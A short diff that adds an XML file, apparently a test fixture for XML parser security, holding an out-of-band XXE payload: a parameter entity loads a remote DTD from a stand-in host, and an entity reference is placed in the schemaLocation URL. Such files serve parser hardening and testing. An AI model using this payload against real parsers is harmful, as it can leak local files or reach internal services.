@@ -1,0 +1,8 @@
+<?xml version='1.0'?>
+<!DOCTYPE data [
+<!ENTITY % remote SYSTEM "http://publicServer.com/external_entity_attribute.dtd">
+%remote; 
+]>
+<ttt:data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+   xmlns:ttt="http://test.com/attack"
+ xsi:schemaLocation="ttt http://publicServer.com/&internal;">4</ttt:data>
